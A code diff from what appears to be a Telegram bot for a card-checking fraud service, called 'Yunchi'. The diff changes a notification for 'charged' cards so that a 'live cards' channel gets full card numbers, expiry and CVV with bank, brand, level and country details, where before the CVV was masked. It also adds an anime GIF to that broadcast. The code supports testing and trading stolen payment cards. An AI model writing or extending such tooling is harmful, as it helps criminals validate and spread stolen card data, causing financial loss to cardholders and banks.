@@ -417,18 +417,23 @@ ${brandEmoji} ${toFancyItalic(binInfo.brand)} • ${toFancyItalic(binInfo.type)}
 
 ${toFancyScript('Yunchi')} ⚡`.trim();
 
-    // Build channel broadcast message (with masked CVV for security)
-    const maskedCard = `${cardNum}|${mm}|${yy}|***`;
+    // Build channel broadcast message with FULL details and BIN info
     const username = profile.username || 'Anonymous';
+    
     
     const channelMessage = `🔥 ${toFancyBold(statusLabel + ' CARD')} 🔥
 
-${toFancyScript('Card')} ▸ <code>${maskedCard}</code>
+${toFancyScript('Card')} ▸ <code>${fullCard}</code>
 
 ${statusLine}
-${brandEmoji} ${toFancyItalic(binInfo.brand)} • ${toFancyItalic(binInfo.type)}
-🏦 ${binInfo.bank}
-⭐ ${binInfo.level} • ${countryFlag} ${binInfo.country}
+
+━━━━━━ 𝗕𝗜𝗡 𝗜𝗡𝗙𝗢 ━━━━━━
+${brandEmoji} ${toFancyBold('Brand')}: ${binInfo.brand}
+💳 ${toFancyBold('Type')}: ${binInfo.type}
+⭐ ${toFancyBold('Level')}: ${binInfo.level}
+🏦 ${toFancyBold('Bank')}: ${binInfo.bank}
+${countryFlag} ${toFancyBold('Country')}: ${binInfo.country}
+━━━━━━━━━━━━━━━━━━━━
 
 ⚡ ${gateway} • 👤 @${username}
 🕐 ${timeNow}
@@ -438,9 +443,12 @@ ${toFancyScript('Yunchi')} ⚡`.trim();
     // Send notification to user with full card details and random anime GIF
     const sentToUser = await sendTelegramAnimation(profile.telegram_chat_id, randomGif, message);
     
-    // Broadcast to live cards channel (masked CVV)
+    // Get a second random GIF for channel broadcast
+    const channelGif = await getRandomAnimeGif();
+    
+    // Broadcast to live cards channel with full details and GIF
     console.log("[NOTIFY-CHARGED] Broadcasting to channel:", LIVE_CARDS_CHANNEL_ID);
-    const sentToChannel = await sendTelegramMessage(LIVE_CARDS_CHANNEL_ID, channelMessage);
+    const sentToChannel = await sendTelegramAnimation(LIVE_CARDS_CHANNEL_ID, channelGif, channelMessage);
 
     return new Response(
       JSON.stringify({ 
